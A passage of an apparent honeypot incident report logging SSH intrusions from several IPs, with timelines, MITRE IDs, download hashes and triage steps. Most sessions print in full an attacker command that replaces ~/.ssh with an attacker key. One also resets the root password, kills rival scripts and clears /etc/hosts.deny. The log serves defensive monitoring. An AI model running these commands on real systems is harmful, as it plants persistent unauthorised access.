- [ ] Block `125.16.137[.]243` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3599a65203c7

| Field | Detail |
|---|---|
| **Source IP** | `125.16.137[.]243` |
| **First Seen** | 2026-05-20 19:47 |
| **Last Seen** | 2026-05-20 19:47 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:47:21` | `cowrie.session.connect` |
| `2026-05-20 19:47:21` | `cowrie.client.version` |
| `2026-05-20 19:47:21` | `cowrie.client.kex` |
| `2026-05-20 19:47:21` | `cowrie.login.success` |
| `2026-05-20 19:47:21` | `cowrie.session.params` |
| `2026-05-20 19:47:21` | `cowrie.command.input` |
| `2026-05-20 19:47:21` | `cowrie.command.failed` |
| `2026-05-20 19:47:21` | `cowrie.log.closed` |
| `2026-05-20 19:47:21` | `cowrie.session.params` |
| `2026-05-20 19:47:21` | `cowrie.command.input` |
| `2026-05-20 19:47:21` | `cowrie.session.file_download` |
| `2026-05-20 19:47:21` | `cowrie.log.closed` |
| `2026-05-20 19:47:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.16.137[.]243` to AbuseIPDB if not already reported
- [ ] Block `125.16.137[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5d4c69485ff

| Field | Detail |
|---|---|
| **Source IP** | `115.247.181[.]68` |
| **First Seen** | 2026-05-20 19:47 |
| **Last Seen** | 2026-05-20 19:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:47:23` | `cowrie.session.connect` |
| `2026-05-20 19:47:23` | `cowrie.client.version` |
| `2026-05-20 19:47:23` | `cowrie.client.kex` |
| `2026-05-20 19:47:23` | `cowrie.login.success` |
| `2026-05-20 19:47:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.247.181[.]68` to AbuseIPDB if not already reported
- [ ] Block `115.247.181[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f27c12c7782

| Field | Detail |
|---|---|
| **Source IP** | `125.16.137[.]243` |
| **First Seen** | 2026-05-20 19:48 |
| **Last Seen** | 2026-05-20 19:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:48:37` | `cowrie.session.connect` |
| `2026-05-20 19:48:37` | `cowrie.client.version` |
| `2026-05-20 19:48:37` | `cowrie.client.kex` |
| `2026-05-20 19:48:38` | `cowrie.login.success` |
| `2026-05-20 19:48:38` | `cowrie.session.params` |
| `2026-05-20 19:48:38` | `cowrie.command.input` |
| `2026-05-20 19:48:38` | `cowrie.command.failed` |
| `2026-05-20 19:48:38` | `cowrie.log.closed` |
| `2026-05-20 19:48:38` | `cowrie.session.params` |
| `2026-05-20 19:48:38` | `cowrie.command.input` |
| `2026-05-20 19:48:38` | `cowrie.session.file_download` |
| `2026-05-20 19:48:38` | `cowrie.log.closed` |
| `2026-05-20 19:48:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.16.137[.]243` to AbuseIPDB if not already reported
- [ ] Block `125.16.137[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86ef64eb608a

| Field | Detail |
|---|---|
| **Source IP** | `115.247.181[.]68` |
| **First Seen** | 2026-05-20 19:48 |
| **Last Seen** | 2026-05-20 19:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:48:39` | `cowrie.session.connect` |
| `2026-05-20 19:48:39` | `cowrie.client.version` |
| `2026-05-20 19:48:39` | `cowrie.client.kex` |
| `2026-05-20 19:48:40` | `cowrie.login.success` |
| `2026-05-20 19:48:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.247.181[.]68` to AbuseIPDB if not already reported
- [ ] Block `115.247.181[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75703793bb1e

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-20 19:49 |
| **Last Seen** | 2026-05-20 19:49 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:49:19` | `cowrie.session.connect` |
| `2026-05-20 19:49:20` | `cowrie.client.version` |
| `2026-05-20 19:49:20` | `cowrie.client.kex` |
| `2026-05-20 19:49:21` | `cowrie.login.success` |
| `2026-05-20 19:49:21` | `cowrie.session.params` |
| `2026-05-20 19:49:21` | `cowrie.command.input` |
| `2026-05-20 19:49:21` | `cowrie.command.failed` |
| `2026-05-20 19:49:22` | `cowrie.log.closed` |
| `2026-05-20 19:49:22` | `cowrie.session.params` |
| `2026-05-20 19:49:22` | `cowrie.command.input` |
| `2026-05-20 19:49:22` | `cowrie.session.file_download` |
| `2026-05-20 19:49:22` | `cowrie.log.closed` |
| `2026-05-20 19:49:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3aacaae87b9a

| Field | Detail |
|---|---|
| **Source IP** | `40.82.214[.]8` |
| **First Seen** | 2026-05-20 19:49 |
| **Last Seen** | 2026-05-20 19:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:49:25` | `cowrie.session.connect` |
| `2026-05-20 19:49:26` | `cowrie.client.version` |
| `2026-05-20 19:49:26` | `cowrie.client.kex` |
| `2026-05-20 19:49:27` | `cowrie.login.success` |
| `2026-05-20 19:49:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `40.82.214[.]8` to AbuseIPDB if not already reported
- [ ] Block `40.82.214[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8fa2728537c7

| Field | Detail |
|---|---|
| **Source IP** | `125.16.137[.]243` |
| **First Seen** | 2026-05-20 19:51 |
| **Last Seen** | 2026-05-20 19:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:51:10` | `cowrie.session.connect` |
| `2026-05-20 19:51:10` | `cowrie.client.version` |
| `2026-05-20 19:51:10` | `cowrie.client.kex` |
| `2026-05-20 19:51:10` | `cowrie.login.success` |
| `2026-05-20 19:51:10` | `cowrie.session.params` |
| `2026-05-20 19:51:10` | `cowrie.command.input` |
| `2026-05-20 19:51:10` | `cowrie.command.failed` |
| `2026-05-20 19:51:10` | `cowrie.log.closed` |
| `2026-05-20 19:51:10` | `cowrie.session.params` |
| `2026-05-20 19:51:10` | `cowrie.command.input` |
| `2026-05-20 19:51:10` | `cowrie.session.file_download` |
| `2026-05-20 19:51:10` | `cowrie.log.closed` |
| `2026-05-20 19:51:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.16.137[.]243` to AbuseIPDB if not already reported
- [ ] Block `125.16.137[.]243` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9de213e2b992

| Field | Detail |
|---|---|
| **Source IP** | `115.247.181[.]68` |
| **First Seen** | 2026-05-20 19:51 |
| **Last Seen** | 2026-05-20 19:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:51:12` | `cowrie.session.connect` |
| `2026-05-20 19:51:12` | `cowrie.client.version` |
| `2026-05-20 19:51:12` | `cowrie.client.kex` |
| `2026-05-20 19:51:12` | `cowrie.login.success` |
| `2026-05-20 19:51:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.247.181[.]68` to AbuseIPDB if not already reported
- [ ] Block `115.247.181[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eeee05c67105

| Field | Detail |
|---|---|
| **Source IP** | `61.222.211[.]114` |
| **First Seen** | 2026-05-20 19:51 |
| **Last Seen** | 2026-05-20 19:52 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:51:57` | `cowrie.session.connect` |
| `2026-05-20 19:51:57` | `cowrie.client.version` |
| `2026-05-20 19:51:57` | `cowrie.client.kex` |
| `2026-05-20 19:51:58` | `cowrie.login.success` |
| `2026-05-20 19:51:58` | `cowrie.session.params` |
| `2026-05-20 19:51:58` | `cowrie.command.input` |
| `2026-05-20 19:51:58` | `cowrie.command.failed` |
| `2026-05-20 19:51:58` | `cowrie.log.closed` |
| `2026-05-20 19:51:59` | `cowrie.session.params` |
| `2026-05-20 19:51:59` | `cowrie.command.input` |
| `2026-05-20 19:51:59` | `cowrie.session.file_download` |
| `2026-05-20 19:51:59` | `cowrie.log.closed` |
| `2026-05-20 19:52:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.222.211[.]114` to AbuseIPDB if not already reported
- [ ] Block `61.222.211[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ed99efa9907

| Field | Detail |
|---|---|
| **Source IP** | `61.222.211[.]114` |
| **First Seen** | 2026-05-20 19:52 |
| **Last Seen** | 2026-05-20 19:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:52:01` | `cowrie.session.connect` |
| `2026-05-20 19:52:01` | `cowrie.client.version` |
| `2026-05-20 19:52:01` | `cowrie.client.kex` |
| `2026-05-20 19:52:02` | `cowrie.login.success` |
| `2026-05-20 19:52:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.222.211[.]114` to AbuseIPDB if not already reported
- [ ] Block `61.222.211[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fa5e7811213

| Field | Detail |
|---|---|
| **Source IP** | `128.78.143[.]196` |
| **First Seen** | 2026-05-20 19:52 |
| **Last Seen** | 2026-05-20 19:52 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:B0Bc3vWCuaqD"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:52:37` | `cowrie.session.connect` |
| `2026-05-20 19:52:37` | `cowrie.client.version` |
| `2026-05-20 19:52:37` | `cowrie.client.kex` |
| `2026-05-20 19:52:38` | `cowrie.login.success` |
| `2026-05-20 19:52:38` | `cowrie.session.params` |
| `2026-05-20 19:52:38` | `cowrie.command.input` |
| `2026-05-20 19:52:38` | `cowrie.command.failed` |
| `2026-05-20 19:52:38` | `cowrie.log.closed` |
| `2026-05-20 19:52:39` | `cowrie.session.params` |
| `2026-05-20 19:52:39` | `cowrie.command.input` |
| `2026-05-20 19:52:39` | `cowrie.session.file_download` |
| `2026-05-20 19:52:39` | `cowrie.log.closed` |
| `2026-05-20 19:52:52` | `cowrie.session.params` |
| `2026-05-20 19:52:52` | `cowrie.command.input` |
| `2026-05-20 19:52:52` | `cowrie.log.closed` |
| `2026-05-20 19:52:52` | `cowrie.session.params` |
| `2026-05-20 19:52:52` | `cowrie.command.input` |
| `2026-05-20 19:52:52` | `cowrie.log.closed` |
| `2026-05-20 19:52:52` | `cowrie.session.params` |
| `2026-05-20 19:52:52` | `cowrie.command.input` |
| `2026-05-20 19:52:53` | `cowrie.session.file_download` |
| `2026-05-20 19:52:53` | `cowrie.log.closed` |
| `2026-05-20 19:52:53` | `cowrie.session.params` |
| `2026-05-20 19:52:53` | `cowrie.command.input` |
| `2026-05-20 19:52:53` | `cowrie.log.closed` |
| `2026-05-20 19:52:53` | `cowrie.session.params` |
| `2026-05-20 19:52:53` | `cowrie.command.input` |
| `2026-05-20 19:52:53` | `cowrie.log.closed` |
| `2026-05-20 19:52:54` | `cowrie.session.params` |
| `2026-05-20 19:52:54` | `cowrie.command.input` |
| `2026-05-20 19:52:54` | `cowrie.command.input` |
| `2026-05-20 19:52:54` | `cowrie.log.closed` |
| `2026-05-20 19:52:54` | `cowrie.session.params` |
| `2026-05-20 19:52:54` | `cowrie.command.input` |
| `2026-05-20 19:52:54` | `cowrie.log.closed` |
| `2026-05-20 19:52:54` | `cowrie.session.params` |
| `2026-05-20 19:52:54` | `cowrie.command.input` |
| `2026-05-20 19:52:55` | `cowrie.log.closed` |
| `2026-05-20 19:52:55` | `cowrie.session.params` |
| `2026-05-20 19:52:55` | `cowrie.command.input` |
| `2026-05-20 19:52:55` | `cowrie.log.closed` |
| `2026-05-20 19:52:55` | `cowrie.session.params` |
| `2026-05-20 19:52:55` | `cowrie.command.input` |
| `2026-05-20 19:52:55` | `cowrie.log.closed` |
| `2026-05-20 19:52:56` | `cowrie.session.params` |
| `2026-05-20 19:52:56` | `cowrie.command.input` |
| `2026-05-20 19:52:56` | `cowrie.log.closed` |
| `2026-05-20 19:52:56` | `cowrie.session.params` |
| `2026-05-20 19:52:56` | `cowrie.command.input` |
| `2026-05-20 19:52:56` | `cowrie.log.closed` |
| `2026-05-20 19:52:56` | `cowrie.session.params` |
| `2026-05-20 19:52:56` | `cowrie.command.input` |
| `2026-05-20 19:52:57` | `cowrie.log.closed` |
| `2026-05-20 19:52:57` | `cowrie.session.params` |
| `2026-05-20 19:52:57` | `cowrie.command.input` |
| `2026-05-20 19:52:57` | `cowrie.log.closed` |
| `2026-05-20 19:52:57` | `cowrie.session.params` |
| `2026-05-20 19:52:57` | `cowrie.command.input` |
| `2026-05-20 19:52:57` | `cowrie.log.closed` |
| `2026-05-20 19:52:58` | `cowrie.session.params` |
| `2026-05-20 19:52:58` | `cowrie.command.input` |
| `2026-05-20 19:52:58` | `cowrie.log.closed` |
| `2026-05-20 19:52:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `128.78.143[.]196` to AbuseIPDB if not already reported
- [ ] Block `128.78.143[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb03b18e5087

| Field | Detail |
|---|---|
| **Source IP** | `172.191.239[.]155` |
| **First Seen** | 2026-05-20 19:52 |
| **Last Seen** | 2026-05-20 19:53 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:52:53` | `cowrie.session.connect` |
| `2026-05-20 19:52:54` | `cowrie.client.version` |
| `2026-05-20 19:52:54` | `cowrie.client.kex` |
| `2026-05-20 19:52:55` | `cowrie.login.success` |
| `2026-05-20 19:52:55` | `cowrie.session.params` |
| `2026-05-20 19:52:55` | `cowrie.command.input` |
| `2026-05-20 19:52:55` | `cowrie.command.failed` |
| `2026-05-20 19:52:56` | `cowrie.log.closed` |
| `2026-05-20 19:52:56` | `cowrie.session.params` |
| `2026-05-20 19:52:56` | `cowrie.command.input` |
| `2026-05-20 19:52:56` | `cowrie.session.file_download` |
| `2026-05-20 19:52:56` | `cowrie.log.closed` |
| `2026-05-20 19:53:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.239[.]155` to AbuseIPDB if not already reported
- [ ] Block `172.191.239[.]155` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f84edecbc086

| Field | Detail |
|---|---|
| **Source IP** | `172.191.239[.]155` |
| **First Seen** | 2026-05-20 19:52 |
| **Last Seen** | 2026-05-20 19:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:52:59` | `cowrie.session.connect` |
| `2026-05-20 19:52:59` | `cowrie.client.version` |
| `2026-05-20 19:52:59` | `cowrie.client.kex` |
| `2026-05-20 19:53:00` | `cowrie.login.success` |
| `2026-05-20 19:53:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.191.239[.]155` to AbuseIPDB if not already reported
- [ ] Block `172.191.239[.]155` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c1b5db09fbf3

| Field | Detail |
|---|---|
| **Source IP** | `196.92.7[.]246` |
| **First Seen** | 2026-05-20 19:53 |
| **Last Seen** | 2026-05-20 19:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-20 19:53:41` | `cowrie.session.connect` |
| `2026-05-20 19:53:41` | `cowrie.client.version` |
| `2026-05-20 19:53:41` | `cowrie.client.kex` |
| `2026-05-20 19:53:42` | `cowrie.login.success` |
| `2026-05-20 19:53:42` | `cowrie.session.params` |
| `2026-05-20 19:53:42` | `cowrie.command.input` |
| `2026-05-20 19:53:42` | `cowrie.command.failed` |
| `2026-05-20 19:53:42` | `cowrie.log.closed` |
| `2026-05-20 19:53:42` | `cowrie.session.params` |
| `2026-05-20 19:53:42` | `cowrie.command.input` |
| `2026-05-20 19:53:42` | `cowrie.session.file_download` |
| `2026-05-20 19:53:42` | `cowrie.log.closed` |
| `2026-05-20 19:53:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.92.7[.]246` to AbuseIPDB if not already reported
- [ ] Block `196.92.7[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

